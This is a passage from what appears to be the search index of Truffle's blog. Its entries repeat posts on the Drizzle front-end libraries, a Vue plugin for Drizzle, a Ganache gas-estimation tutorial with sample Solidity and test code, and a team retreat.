info? Read on! The Libraries \u00b6 Drizzle \u00b6 The core library responsible for web3, account and contract instantiation; wiring up the necessary synchronizations and providing additional contract functionality. GitHub Repo Drizzle React \u00b6 Provides a DrizzleProvider component and drizzleConnect helper method to make it easier to connect Drizzle with your React app. GitHub Repo Drizzle React Components \u00b6 A library of useful components for common dapp functions. Currently includes: * LoadingContainer : Wraps your app, ensuring it waits for web3 and contract instantiation and displays relevant feedback if something goes wrong. * ContractData : Displays contract call output. * ContractForm : Automatically generates a form for contract transactions. GitHub Repo The Box \u00b6 Shown in the video above, this box makes use of all of Drizzle's libraries in a finished example dapp. GitHub Repo Help us grow this baby! What do you want to see from Drizzle? More components? More options? To put it another way: what are you sick of doing on the front-end? We're excited to hear your feedback and can't wait to see what you'll build! -- Josh & the Truffle Team","title":"Drizzle - Reactive Ethereum Data for Front-ends"},{"location":"blog/drizzle-reactive-ethereum-data-for-front-ends/index.html#the-libraries","text":"","title":"The Libraries"},{"location":"blog/drizzle-reactive-ethereum-data-for-front-ends/index.html#drizzle","text":"The core library responsible for web3, account and contract instantiation; wiring up the necessary synchronizations and providing additional contract functionality. GitHub Repo","title":"Drizzle"},{"location":"blog/drizzle-reactive-ethereum-data-for-front-ends/index.html#drizzle-react","text":"Provides a DrizzleProvider component and drizzleConnect helper method to make it easier to connect Drizzle with your React app. GitHub Repo","title":"Drizzle React"},{"location":"blog/drizzle-reactive-ethereum-data-for-front-ends/index.html#drizzle-react-components","text":"A library of useful components for common dapp functions. Currently includes: * LoadingContainer : Wraps your app, ensuring it waits for web3 and contract instantiation and displays relevant feedback if something goes wrong. * ContractData : Displays contract call output. * ContractForm : Automatically generates a form for contract transactions. GitHub Repo","title":"Drizzle React Components"},{"location":"blog/drizzle-reactive-ethereum-data-for-front-ends/index.html#the-box","text":"Shown in the video above, this box makes use of all of Drizzle's libraries in a finished example dapp. GitHub Repo Help us grow this baby! What do you want to see from Drizzle? More components? More options? To put it another way: what are you sick of doing on the front-end? We're excited to hear your feedback and can't wait to see what you'll build! -- Josh & the Truffle Team","title":"The Box"},{"location":"blog/drizzle-vue-a-truffle-story/index.html","text":"Truffle is an organization that maintains a balance of transparency, mentorship, encouragement, inclusivity and humor that I'm thankful for everyday. While much could be written about Truffle's management culture, I want to share my experience of working on a side project here. Our remote work setup and the openness of our team contributes to a healthy and productive environment. The ability to schedule zoom sessions to brainstorm and discuss ideas fits well with our schedule. Every member contributes to this culture being generous with their time and knowledge. I'm happy and inspired to see team members grow as developers through the subtle mentorship as a result of our culture. For most of my career, I dreaded mandatory soul draining review type meetings, but at Truffle, I look forward to the incredibly productive and creative weekly one-on-ones I have with Joshua Quintal, our Product Lead. Josh originally developed Drizzle and we often discuss its role in the dapp ecosystem, issues and roadmap during our meetings. About Drizzle \u00b6 Drizzle is a Smart Contract Store with a subscription and mutation API that abstracts away the boilerplate for reading and writing smart contract state as well as listening for contract events. Drizzle originated as a helper library for a React project Josh was developing. However he came to realize that the Smart Contract Store was an important piece needed in dapp development as applications start to scale. In Web 2.0 the need to manage and reason about state at scale has led to libraries like [1] Redux . Similarly, we want to give web 3.0 dapp developers these best practices to leverage as their applications grow in complexity. Drizzle's Unintended Front End Frameworks Exclusion \u00b6 Unfortunately, this is not how Drizzle is understood by developers we interviewed formally and informally. The most common misunderstanding is that Drizzle is coupled with React, the most popular JavaScript front end framework. We can't blame our community as most of our documentation focuses on implementing Dapps using React. Drizzle was initially released with bindings only for React which created this misperception that excluded developers from utilizing other front end frameworks such as Vue and Angular. The problem is that we didn't offer an easy solution for Vue or Angular and our documentation doesn't offer guidance. We want to change this! We want to support all the frameworks! A Vue Plugin Side Project \u00b6 I felt this was an important problem to solve in order to improve the dapp developer experience. It was important to get Drizzle working for Vue. Unfortunately, I knew nothing about Vue. In previous organizations I was a part of, I would have shied away from pursuing this project. However, at Truffle I felt comfortable and empowered to champion the idea. Josh encouraged me to spend the time needed to study Vue and experiment with the concepts. The basic plan was to: - Use Vuex, Vue's popular State management plugin - Transform Drizzle's redux store to be consumed by Vuex - A redux store as an [2] Observable which would allow us to transform/map drizzle state to a more state pieces that Vuex could consume. - This would allow us to have more efficient UI renders by using RxJS techniques like distinctUntilChanged - Create basic Vue components mimicking drizzle-react-components - Vue's architecture allows us to use the adaptor as a datasource as well as provide basic support for Components that can render the data. This gives Vue developers to use our basic Components to make quick proof of concepts, and the flexibility to create richer Components when they need to. A [3] basic proof of concept eventually surfaced and I was happy with the outcome as it showed a path forward to Angular using this approach with RxJS and can't wait to test it out! Collaboration And Improvements \u00b6 Another aspect of Truffle's culture is to promote collaboration and exchange ideas with our community, and meet like minded developers and advocates working on similar problems. We're encouraged to go to meetups and be advocates for this incredible space. I reached out to Julien Klepatch on reddit after seeing his impressive [4] Drizzle overview video and asked for his feedback on the Vue Plugin. His participation, code contribution, code review and feedback clarified the project's direction and generally improved the codebase. Furthermore, he created 3 videos to explain the new plugin. - [5] Drizzle Vue Plugin: overview - [6] Drizzle Vue Plugin: Custom Components - [7] Drizzle Vue Plugin: Events We also run a range of educational programs as part of Truffle University, that amongst other things, teaches developers how to use our full suite of tools. As part of the experience, students are mentored by the team and are encouraged to contribute to open-source projects, such as the Truffle Suite itself. James Kehoe, a developer in our first cohort, uses Vue on a daily basis and took an interest in the plugin. He took the initial design of the Contract Event Logic and turned it into idiomatic Vue. James also improved the documentation and introduced testing to the project. I learned a lot about Vue pairing with James, and look forward to future sessions with him. Take A Preview \u00b6 You can preview the [3] Plugin before we officially release it. Be sure to check out Julien's videos for an excellent walkthrough: [5] Drizzle Vue Plugin: overview , [6] Drizzle Vue Plugin: Custom Components and [7] Drizzle Vue Plugin: Events This project happened because of Truffle's enabling and supportive culture. Truffle is cool like that! Also, co-MVPs James and Julien's improved the Vue Plugin and made it a viable tool. In fact, I consider them to be original contributors and am happy to see their continued involvement in the project. Come meet the team and learn about our tools at TruffleCon. We're looking forward to meeting you all! References \u00b6 https://redux.js.org/ https://redux.js.org/api/store#subscribe https://github.com/trufflesuite/drizzle-vue-plugin https://www.youtube.com/watch?v=QH_yLPYQEs4 https://www.youtube.com/watch?v=XaVEZ1ucxac https://www.youtube.com/watch?v=ApJwXfWKl7Q https://www.youtube.com/watch?v=xyoztqeYd6U","title":"Drizzle Vue - A Truffle Story"},{"location":"blog/drizzle-vue-a-truffle-story/index.html#about-drizzle","text":"Drizzle is a Smart Contract Store with a subscription and mutation API that abstracts away the boilerplate for reading and writing smart contract state as well as listening for contract events. Drizzle originated as a helper library for a React project Josh was developing. However he came to realize that the Smart Contract Store was an important piece needed in dapp development as applications start to scale. In Web 2.0 the need to manage and reason about state at scale has led to libraries like [1] Redux . Similarly, we want to give web 3.0 dapp developers these best practices to leverage as their applications grow in complexity.","title":"About Drizzle"},{"location":"blog/drizzle-vue-a-truffle-story/index.html#drizzles-unintended-front-end-frameworks-exclusion","text":"Unfortunately, this is not how Drizzle is understood by developers we interviewed formally and informally. The most common misunderstanding is that Drizzle is coupled with React, the most popular JavaScript front end framework. We can't blame our community as most of our documentation focuses on implementing Dapps using React. Drizzle was initially released with bindings only for React which created this misperception that excluded developers from utilizing other front end frameworks such as Vue and Angular. The problem is that we didn't offer an easy solution for Vue or Angular and our documentation doesn't offer guidance. We want to change this! We want to support all the frameworks!","title":"Drizzle's Unintended Front End Frameworks Exclusion"},{"location":"blog/drizzle-vue-a-truffle-story/index.html#a-vue-plugin-side-project","text":"I felt this was an important problem to solve in order to improve the dapp developer experience. It was important to get Drizzle working for Vue. Unfortunately, I knew nothing about Vue. In previous organizations I was a part of, I would have shied away from pursuing this project. However, at Truffle I felt comfortable and empowered to champion the idea. Josh encouraged me to spend the time needed to study Vue and experiment with the concepts. The basic plan was to: - Use Vuex, Vue's popular State management plugin - Transform Drizzle's redux store to be consumed by Vuex - A redux store as an [2] Observable which would allow us to transform/map drizzle state to a more state pieces that Vuex could consume. - This would allow us to have more efficient UI renders by using RxJS techniques like distinctUntilChanged - Create basic Vue components mimicking drizzle-react-components - Vue's architecture allows us to use the adaptor as a datasource as well as provide basic support for Components that can render the data. This gives Vue developers to use our basic Components to make quick proof of concepts, and the flexibility to create richer Components when they need to. A [3] basic proof of concept eventually surfaced and I was happy with the outcome as it showed a path forward to Angular using this approach with RxJS and can't wait to test it out!","title":"A Vue Plugin Side Project"},{"location":"blog/drizzle-vue-a-truffle-story/index.html#collaboration-and-improvements","text":"Another aspect of Truffle's culture is to promote collaboration and exchange ideas with our community, and meet like minded developers and advocates working on similar problems. We're encouraged to go to meetups and be advocates for this incredible space. I reached out to Julien Klepatch on reddit after seeing his impressive [4] Drizzle overview video and asked for his feedback on the Vue Plugin. His participation, code contribution, code review and feedback clarified the project's direction and generally improved the codebase. Furthermore, he created 3 videos to explain the new plugin. - [5] Drizzle Vue Plugin: overview - [6] Drizzle Vue Plugin: Custom Components - [7] Drizzle Vue Plugin: Events We also run a range of educational programs as part of Truffle University, that amongst other things, teaches developers how to use our full suite of tools. As part of the experience, students are mentored by the team and are encouraged to contribute to open-source projects, such as the Truffle Suite itself. James Kehoe, a developer in our first cohort, uses Vue on a daily basis and took an interest in the plugin. He took the initial design of the Contract Event Logic and turned it into idiomatic Vue. James also improved the documentation and introduced testing to the project. I learned a lot about Vue pairing with James, and look forward to future sessions with him.","title":"Collaboration And Improvements"},{"location":"blog/drizzle-vue-a-truffle-story/index.html#take-a-preview","text":"You can preview the [3] Plugin before we officially release it. Be sure to check out Julien's videos for an excellent walkthrough: [5] Drizzle Vue Plugin: overview , [6] Drizzle Vue Plugin: Custom Components and [7] Drizzle Vue Plugin: Events This project happened because of Truffle's enabling and supportive culture. Truffle is cool like that! Also, co-MVPs James and Julien's improved the Vue Plugin and made it a viable tool. In fact, I consider them to be original contributors and am happy to see their continued involvement in the project. Come meet the team and learn about our tools at TruffleCon. We're looking forward to meeting you all!","title":"Take A Preview"},{"location":"blog/drizzle-vue-a-truffle-story/index.html#references","text":"https://redux.js.org/ https://redux.js.org/api/store#subscribe https://github.com/trufflesuite/drizzle-vue-plugin https://www.youtube.com/watch?v=QH_yLPYQEs4 https://www.youtube.com/watch?v=XaVEZ1ucxac https://www.youtube.com/watch?v=ApJwXfWKl7Q https://www.youtube.com/watch?v=xyoztqeYd6U","title":"References"},{"location":"blog/ethereum-gas-exactimation/index.html","text":"In Ethereum, estimating gas for a given transaction is a tricky problem to solve (especially when attempting to maintain EIP-114 compliance). Most of the well-known Ethereum implementations like Geth \u00b9 and Parity \u00b2 use interval halving (binary search) to estimate gas by running transactions through the EVM until an approximate estimation converges. At Truffle , we decided such an approach was an unnecessarily CPU-intensive solution to the problem and set out to find a (theoretically) more performant and perfectly accurate way of estimating gas. The result? Gas exactimation . In this tutorial, we\u2019ll go over gas exactimation at a high level in order to demonstrate its precision. Complete example available at the following repo . Prerequisites: You should be familiar with Truffle, Ganache, and Solidity. If you need an introduction please consult the following resources: Truffle Quickstart Ganache Quickstart Solidity Documentation EIP-114, or the \u201c1/64ths rule\u201d \u00b6 EIP-114 mandates that certain stackdepth-creating opcodes withhold 1/64th of remaining gas from the stack they create. In practice this means: The gas required for a successful transaction can be greater than the actual gas spent (similar to how gas refunds behave). The extra gas required for a successful transaction varies depending on the transaction\u2019s initial gas amount. A long-standing issue with Ganache has been the fact that we haven\u2019t returned EIP-114 compliant gas estimations. This has caused our gas estimates to be too low in cases where a transaction executed certain opcodes. Gas exactimation addresses this by considering how the gas withheld at any nested stack depth/frame affects the gas needed outside of its execution context. Let\u2019s see it in action. Create a New Truffle Project \u00b6 We will use truffle init to create a new Truffle project and then wire up an example Solidity smart contract and test script. // In a new project directory... $ truffle init Setup an Example Smart Contract \u00b6 With our new project initialized, we will create an example file: ContractFactory.sol . $ touch ./contracts/ContractFactory.sol Our file will have two contracts, Contract and ContractFactory . ContractFactory will have the method createInstance that we will use to create a new empty Contract . // ./contracts/ContractFactory.sol pragma solidity ^0.5.0; contract ContractFactory { function createInstance() public { new Contract(); } } contract Contract { constructor() public {} } Note the new keyword being used to create a new Contract . A valid statement containing the new keyword gets compiled to bytecode containing the CREATE opcode which is subject to the EIP-114 1/64th gas withholding. Write a Test Case \u00b6 Next, we will write a ContractFactory test case. $ touch ./test/ContractFactory.js This test case will deploy ContractFactory to a Ganache test network and use a gas estimate provided by Ganache to create a new Contract . // ./test/ContractFactory.js const ContractFactory = artifacts.require(\"ContractFactory\"); contract(\"ContractFactory\", () => { it(\"...should deploy and successfully call createInstance using the method's provided gas estimate\", async () => { const contractFactoryInstance = await ContractFactory.new(); const gasEstimate = await contractFactoryInstance.createInstance.estimateGas(); const tx = await contractFactoryInstance.createInstance({ gas: gasEstimate }); assert(tx); }); }); A Quick Check \u00b6 Before we run our test, we\u2019ll download the most recent version of Truffle that uses Ganache before gas exactimation. // In the project directory... $ npm i truffle@5.0.13 And we\u2019ll make sure we have the latest version of Truffle installed globally that uses Ganache with gas exactimation. $ npm i -g truffle Testing Before and After \u00b6 $ npx truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert And when we use gas exactimation... $ truffle test ... ... Contract: ContractFactory \u2713 ...should deploy and successfully call createInstance using the method ' s provided gas estimate ( 130ms ) 1 passing ( 143ms ) !!!! Testing Exactimation \u00b6 But is gas exactimation actually exact ? \ud83e\udd14 We\u2019ll open our test file and subtract exactly a single unit of gas from the gasEstimate before sending our test transaction. // ./test/ContractFactory.js const ContractFactory = artifacts.require ( \"ContractFactory\" ) ; contract ( \"ContractFactory\" , () = > { it ( \"...should deploy and successfully call createInstance using the method's provided gas estimate\" , async () = > { const contractFactoryInstance = await ContractFactory.new () ; const gasEstimate = await contractFactoryInstance.createInstance.estimateGas () ; const tx = await contractFactoryInstance.createInstance ({ gas: gasEstimate - 1 }) ; assert ( tx ) ; }) ; }) ; Running our test again against Ganache with gas exactimation... $ truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert Exactimation confirmed \ud83d\ude80. Note: Since the initial release of gas exactimation, an even more performant iteration of the algorithm is currently in review here.","title":"Ethereum Gas Exactimation"},{"location":"blog/ethereum-gas-exactimation/index.html#eip-114-or-the-164ths-rule","text":"EIP-114 mandates that certain stackdepth-creating opcodes withhold 1/64th of remaining gas from the stack they create. In practice this means: The gas required for a successful transaction can be greater than the actual gas spent (similar to how gas refunds behave). The extra gas required for a successful transaction varies depending on the transaction\u2019s initial gas amount. A long-standing issue with Ganache has been the fact that we haven\u2019t returned EIP-114 compliant gas estimations. This has caused our gas estimates to be too low in cases where a transaction executed certain opcodes. Gas exactimation addresses this by considering how the gas withheld at any nested stack depth/frame affects the gas needed outside of its execution context. Let\u2019s see it in action.","title":"EIP-114, or the \u201c1/64ths rule\u201d"},{"location":"blog/ethereum-gas-exactimation/index.html#create-a-new-truffle-project","text":"We will use truffle init to create a new Truffle project and then wire up an example Solidity smart contract and test script. // In a new project directory... $ truffle init","title":"Create a New Truffle Project"},{"location":"blog/ethereum-gas-exactimation/index.html#setup-an-example-smart-contract","text":"With our new project initialized, we will create an example file: ContractFactory.sol . $ touch ./contracts/ContractFactory.sol Our file will have two contracts, Contract and ContractFactory . ContractFactory will have the method createInstance that we will use to create a new empty Contract . // ./contracts/ContractFactory.sol pragma solidity ^0.5.0; contract ContractFactory { function createInstance() public { new Contract(); } } contract Contract { constructor() public {} } Note the new keyword being used to create a new Contract . A valid statement containing the new keyword gets compiled to bytecode containing the CREATE opcode which is subject to the EIP-114 1/64th gas withholding.","title":"Setup an Example Smart Contract"},{"location":"blog/ethereum-gas-exactimation/index.html#write-a-test-case","text":"Next, we will write a ContractFactory test case. $ touch ./test/ContractFactory.js This test case will deploy ContractFactory to a Ganache test network and use a gas estimate provided by Ganache to create a new Contract . // ./test/ContractFactory.js const ContractFactory = artifacts.require(\"ContractFactory\"); contract(\"ContractFactory\", () => { it(\"...should deploy and successfully call createInstance using the method's provided gas estimate\", async () => { const contractFactoryInstance = await ContractFactory.new(); const gasEstimate = await contractFactoryInstance.createInstance.estimateGas(); const tx = await contractFactoryInstance.createInstance({ gas: gasEstimate }); assert(tx); }); });","title":"Write a Test Case"},{"location":"blog/ethereum-gas-exactimation/index.html#a-quick-check","text":"Before we run our test, we\u2019ll download the most recent version of Truffle that uses Ganache before gas exactimation. // In the project directory... $ npm i truffle@5.0.13 And we\u2019ll make sure we have the latest version of Truffle installed globally that uses Ganache with gas exactimation. $ npm i -g truffle","title":"A Quick Check"},{"location":"blog/ethereum-gas-exactimation/index.html#testing-before-and-after","text":"$ npx truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert And when we use gas exactimation... $ truffle test ... ... Contract: ContractFactory \u2713 ...should deploy and successfully call createInstance using the method ' s provided gas estimate ( 130ms ) 1 passing ( 143ms ) !!!!","title":"Testing Before and After"},{"location":"blog/ethereum-gas-exactimation/index.html#testing-exactimation","text":"But is gas exactimation actually exact ? \ud83e\udd14 We\u2019ll open our test file and subtract exactly a single unit of gas from the gasEstimate before sending our test transaction. // ./test/ContractFactory.js const ContractFactory = artifacts.require ( \"ContractFactory\" ) ; contract ( \"ContractFactory\" , () = > { it ( \"...should deploy and successfully call createInstance using the method's provided gas estimate\" , async () = > { const contractFactoryInstance = await ContractFactory.new () ; const gasEstimate = await contractFactoryInstance.createInstance.estimateGas () ; const tx = await contractFactoryInstance.createInstance ({ gas: gasEstimate - 1 }) ; assert ( tx ) ; }) ; }) ; Running our test again against Ganache with gas exactimation... $ truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert Exactimation confirmed \ud83d\ude80. Note: Since the initial release of gas exactimation, an even more performant iteration of the algorithm is currently in review here.","title":"Testing Exactimation"},{"location":"blog/first-ever-truffle-retreat/index.html","text":"This past summer, the Truffle team got together to together to define our roles, our mission statement, and our product roadmap - and had some fun in the process. The Truffle team is fully remote. This has a lot of advantages in that it allows for a wide range of people available to work on your project; but it can also make it difficult to get to know your coworkers. I started Truffle in early 2015 as the sole developer, and it stayed that way for nearly a year and half. John McDowell joined in late 2016, and by the time of the retreat we happily brought Nick D\u2019Andrea and Josh Quintal on board. All interviews happened over Skype. I live in Yakima, Washington. John lives in Victoria, British Columbia. Nick lives in Philadelphia, and Josh lives in Detroit. That\u2019s a lot of distance between us. When we brought Nick and Josh onto the team, it became obvious that we needed to meet up in person to solidify our roles, define responsibilities, and establish our own culture before growing the team even larger. And we wanted to hang out in the woods, at the top of a mountain, and get to know each other. The Location \u00b6 We had our retreat near Victoria, BC where John lives. Nick, Josh and I traveled all day through a series of planes, ferries and car rides to finally arrive at the house around 7 pm. The house sits atop a large hill in Braemer Heights overlooking all of Victoria, and on a good day has a beautiful view of Mt. Baker in the States. The house was the definition of excess for a team of four, especially with only three of us sleeping there. It had five bedrooms and four bathrooms; a deck with a grill; three stories, the topmost containing only an office with 360-degree windows; and loads of wildlife. Unexpectedly, it was only ten minutes away from a Costco, which helped immensely. Even more unexpectedly, this mansion cost us less than three hotel rooms and a coworking space. The Work \u00b6 I had a few specific goals for our retreat: to define everyone\u2019s roles and responsibilities within our team, to define our product roadmap for the next six months, and to create a mission statement for Truffle that our whole team could rally behind. Retrospective \u00b6 We started with a retro. We wanted to evaluate where we were as a team before deciding where we wanted to go in the future. So on Tuesday morning, we sat down and gave praise for what we\u2019ve done well and identified areas where we could improve. I brought a list of business areas that are important for Truffle -- things like development, technical leadership, branding, marketing, etc. -- and we graded ourselves on each of them. This turned out to be an interesting exercise. As the leader of the team you want to say \u201cwe\u2019re doing great\u201d, and not diminish anyone\u2019s efforts -- because, it\u2019s true, we\u2019ve come far for a small team. However, we need to know where we can improve and how different areas of our company, teamwork and products stack up to the rest. In general, we all seemed to agree on the results: Branding and growth have been stellar (e.g., we have a good product that people like to use), but more external communication -- like our technical leadership, our relationship with the Ethereum Foundation, and relationships with some of our VIP users -- could use some improvement. Though these results were mostly subjective judgements, the conversations that resulted helped inform discussions about our roles and future roadmap. Roles & Responsibilities \u00b6 The Truffle team had already doubled in size in 2017, and right before the retreat two new team members -- Ben Burns and Mike Pumphrey -- had accepted offers (welcome!). So we knew we had some work to do regarding defining our roles and how we work together as a team. Before the retreat, I had met separately with Nick, Josh, and John to evaluate how they felt about their current roles at Truffle. We each talked about what they wanted to do both within the team and professionally, and how I could help them get there. Then we used this time at the retreat to reorganize the work so that it aligns with each team member\u2019s personal goals as well as the group\u2019s goals. We created a new org chart and chain of command, including the new team members we knew were coming on. We decided that Josh and John would share design responsibilities for our website, logo design and general aesthetics for all of our products. Ben, who started in October, would take on the internals of the TestRPC (now Ganache ) and related products ensuring we stay up to date with the Ethereum ecosystem. And Mike would be coming on board to wrangle all of our documentation and learning content, eventually molding it into tailored courses we\u2019d offer to individuals and businesses. That just left Nick and I. Though we both knew Nick would work on the internals of Truffle when he was hired, we didn\u2019t know the extent of the work required; in addition to improving Truffle, Nick would be burdened with the arduous task of softly and lovingly ripping my baby from my arms. That is, Truffle\u2019s my baby, and I\u2019ve been nurturing it from day one. In order to build a more functional and growing team, it became clear I\u2019d have to let go of the internal implementation details and focus more on our business and our product, leaving Nick to explore the tool\u2019s technical way forward. This transition has been a great growing experience already, both professionally and personally. We\u2019ll continue to evaluate this structure over the next six months to see how it works out. Mission Statement \u00b6 The next step was to determine why we\u2019re here. The big three questions were: Why are you here? What do you value? And what do you stand for? The point was to elicit each team member\u2019s value systems to get a big picture of what it is we really care about. My original plan for this session was to put each person on the spot and ask them those questions directly. As it turns out, this interrogation technique was not the best way to get meaningful, genuine answers from the team. Luckily, John came up with a better plan. He suggested we have each member of the team write their values on six index cards, and then have the whole team talk about each other\u2019s values, create a big list, and vote on them to determine our company values. The conversation helped us all understand how different we were, and how much our values varied. We expressed everything from receiving good pay to building the distributed ecosystem. In the end, we all agreed why we\u2019re here. Our new mission statement: Truffle builds useful tools for the next generation of blockchain technologies. We enable the growth of the Ethereum and open source communities, help to improve the role of decentralization in society, and empower developers to achieve their goals. Product Roadmap \u00b6 On Thursday, we got into the details of what we\u2019ve been working on at Truffle and where we\u2019re going. This included presentations for new products [SPOILER ALERT!] and discussions about specific features. We\u2019ve been hard at work since we drafted this post, so some you may have heard of already: Truffle 4.0! - with a debugger, improved development and testing experience, and more! Ganache - a personal blockchain for developers. Drizzle - a frontend framework for React and Angular to easily connect Truffle-based projects. Project Hotcakes - a full stack suite for web applications. Live - a browser-based, interactive Truffle IDE. We also talked about revamping our development processes, which included not only how we work together as well as beefing up our continuous integration systems and making it very easy for users to contribute to Truffle projects. Stay tuned for more info! The Fun \u00b6 In the middle of all of this work we wanted to get some bonding time in too. And if you haven\u2019t been to Victoria, it really is gorgeous, and we couldn\u2019t let this trip go to waste. So on Wednesday we got in John\u2019s Honda Element and drove for two hours to Port Renfrew. The hike on paper: beach hike, sun, potentially bears, great outdoorsy time. The hike in reality: We didn\u2019t see any bears, and we got completely rained out of the hike. But, we also took our first Truffle team selfie: And eventually when the rain cleared got this cloudy-but-serene view from the dock at Port Renfrew. And when we got back to the house, we made dinner, played board games, and drank a bunch of wine. So overall, we had some successful bonding time. Going Home \u00b6 Being able to all be in the same room for the first time ever was extremely rewarding. It gave us a great foundation for the future of our working relationships and of Truffle as a whole, and increased our personal relationships in a way you don\u2019t get when working 100% remotely. We\u2019ll definitely be making retreats a recurring part of working at Truffle. Now that we\u2019re all back to work as usual, we\u2019ve already taken the results of the retreat to heart. We\u2019ve implemented our new development processes (info to come soon); revamped our products and offerings to be more in line with each other; have been settling into our new roles amazingly, and with little conflict; and overall we\u2019ve been having a great time. There are a few things I want to make sure I remember coming out of this retreat: You can build more of a relationship with someone in 10 minutes in person than you can in 3 months on Slack. I want to maintain this momentum and rapport. We\u2019ve found that video calls are the closest you can get on a 100% remote team. Going forward, we\u2019re now having one-on-one meetings every week to make sure we can keep up our rapport and ensure we\u2019re giving each other consistent, useful feedback. The right processes and structures are the basis for responsibility, autonomy, and trust between teammates. During the retreat we collectively decided on rules and structure that would help us work better together. These rules were meant to increase responsibility and autonomy and provide a basis of trust in decision-making where each of us are responsible for our own individual specialties. I want to increase this trust and know that each team member can make the right decisions when needed. Building rapport with your teammates is worth the effort. In a remote team you don\u2019t often get the chance to invite your coworker over for dinner or go to a local event. Bridging this gap is hard, and requires conscious effort, but has so many benefits including happiness, morale and general enthusiasm toward coming into work every day. I want to continue to bridge this gap and foster a culture where even if we\u2019re a thousand miles away, we can still feel close enough to have each other over for dinner. Final thought: I\u2019d eat Nick\u2019s caprese salad and Josh\u2019s sirloin medallions any day of the week.","title":"Our First Ever Truffle Retreat"},{"location":"blog/first-ever-truffle-retreat/index.html#the-location","text":"We had our retreat near Victoria, BC where John lives. Nick, Josh and I traveled all day through a series of planes, ferries and car rides to finally arrive at the house around 7 pm. The house sits atop a large hill in Braemer Heights overlooking all of Victoria, and on a good day has a beautiful view of Mt. Baker in the States. The house was the definition of excess for a team of four, especially with only three of us sleeping there. It had five bedrooms and four bathrooms; a deck with a grill; three stories, the topmost containing only an office with 360-degree windows; and loads of wildlife. Unexpectedly, it was only ten minutes away from a Costco, which helped immensely. Even more unexpectedly, this mansion cost us less than three hotel rooms and a coworking space.","title":"The Location"},{"location":"blog/first-ever-truffle-retreat/index.html#the-work","text":"I had a few specific goals for our retreat: to define everyone\u2019s roles and responsibilities within our team, to define our product roadmap for the next six months, and to create a mission statement for Truffle that our whole team could rally behind.","title":"The Work"},{"location":"blog/first-ever-truffle-retreat/index.html#retrospective","text":"We started with a retro. We wanted to evaluate where we were as a team before deciding where we wanted to go in the future. So on Tuesday morning, we sat down and gave praise for what we\u2019ve done well and identified areas where we could improve. I brought a list of business areas that are important for Truffle -- things like development, technical leadership, branding, marketing, etc. -- and we graded ourselves on each of them. This turned out to be an interesting exercise. As the leader of the team you want to say \u201cwe\u2019re doing great\u201d, and not diminish anyone\u2019s efforts -- because, it\u2019s true, we\u2019ve come far for a small team. However, we need to know where we can improve and how different areas of our company, teamwork and products stack up to the rest. In general, we all seemed to agree on the results: Branding and growth have been stellar (e.g., we have a good product that people like to use), but more external communication -- like our technical leadership, our relationship with the Ethereum Foundation, and relationships with some of our VIP users -- could use some improvement. Though these results were mostly subjective judgements, the conversations that resulted helped inform discussions about our roles and future roadmap.","title":"Retrospective"},{"location":"blog/first-ever-truffle-retreat/index.html#roles-responsibilities","text":"The Truffle team had already doubled in size in 2017, and right before the retreat two new team members -- Ben Burns and Mike Pumphrey -- had accepted offers (welcome!). So we knew we had some work to do regarding defining our roles and how we work together as a team. Before the retreat, I had met separately with Nick, Josh, and John to evaluate how they felt about their current roles at Truffle. We each talked about what they wanted to do both within the team and professionally, and how I could help them get there. Then we used this time at the retreat to reorganize the work so that it aligns with each team member\u2019s personal goals as well as the group\u2019s goals. We created a new org chart and chain of command, including the new team members we knew were coming on. We decided that Josh and John would share design responsibilities for our website, logo design and general aesthetics for all of our products. Ben, who started in October, would take on the internals of the TestRPC (now Ganache ) and related products ensuring we stay up to date with the Ethereum ecosystem. And Mike would be coming on board to wrangle all of our documentation and learning content, eventually molding it into tailored courses we\u2019d offer to individuals and businesses. That just left Nick and I. Though we both knew Nick would work on the internals of Truffle when he was hired, we didn\u2019t know the extent of the work required; in addition to improving Truffle, Nick would be burdened with the arduous task of softly and lovingly ripping my baby from my arms. That is, Truffle\u2019s my baby, and I\u2019ve been nurturing it from day one. In order to build a more functional and growing team, it became clear I\u2019d have to let go of the internal implementation details and focus more on our business and our product, leaving Nick to explore the tool\u2019s technical way forward. This transition has been a great growing experience already, both professionally and personally. We\u2019ll continue to evaluate this structure over the next six months to see how it works out.","title":"Roles &amp; Responsibilities"},{"location":"blog/first-ever-truffle-retreat/index.html#mission-statement","text":"The next step was to determine why we\u2019re here. The big three questions were: Why are you here? What do you value? And what do you stand for? The point was to elicit each team member\u2019s value systems to get a big picture of what it is we really care about. My original plan for this session was to put each person on the spot and ask them those questions directly. As it turns out, this interrogation technique was not the best way to get meaningful, genuine answers from the team. Luckily, John came up with a better plan. He suggested we have each member of the team write their values on six index cards, and then have the whole team talk about each other\u2019s values, create a big list, and vote on them to determine our company values. The conversation helped us all understand how different we were, and how much our values varied. We expressed everything from receiving good pay to building the distributed ecosystem. In the end, we all agreed why we\u2019re here. Our new mission statement: Truffle builds useful tools for the next generation of blockchain technologies. We enable the growth of the Ethereum and open source communities, help to improve the role of decentralization in society, and empower developers to achieve their goals.","title":"Mission Statement"},{"location":"blog/first-ever-truffle-retreat/index.html#product-roadmap","text":"On Thursday, we got into the details of what we\u2019ve been working on at Truffle and where we\u2019re going. This included presentations for new products [SPOILER ALERT!] and discussions about specific features. We\u2019ve been hard at work since we drafted this post, so some you may have heard of already: Truffle 4.0! - with a debugger, improved development and testing experience, and more! Ganache - a personal blockchain for developers. Drizzle - a frontend framework for React and Angular to easily connect Truffle-based projects. Project Hotcakes - a full stack suite for web applications. Live - a browser-based, interactive Truffle IDE. We also talked about revamping our development processes, which included not only how we work together as well as beefing up our continuous integration systems and making it very easy for users to contribute to Truffle projects. Stay tuned for more info!","title":"Product Roadmap"},{"location":"blog/first-ever-truffle-retreat/index.html#the-fun","text":"In the middle of all of this work we wanted to get some bonding time in too. And if you haven\u2019t been to Victoria, it really is gorgeous, and we couldn\u2019t let this trip go to waste. So on Wednesday we got in John\u2019s Honda Element and drove for two hours to Port Renfrew. The hike on paper: beach hike, sun, potentially bears, great outdoorsy time. The hike in reality: We didn\u2019t see any bears, and we got completely rained out of the hike. But, we also took our first Truffle team selfie: And eventually when the rain cleared got this cloudy-but-serene view from the dock at Port Renfrew. And when we got back to the house, we made dinner, played board games, and drank a bunch of wine. So overall, we had some successful bonding time.","title":"The Fun"},{"location":"blog/first-ever-truffle-retreat/index.html#going-home","text":"Being able to all be in the same room for the first time ever was extremely rewarding. It gave us a great foundation for the future of our working relationships and of Truffle as a whole, and increased 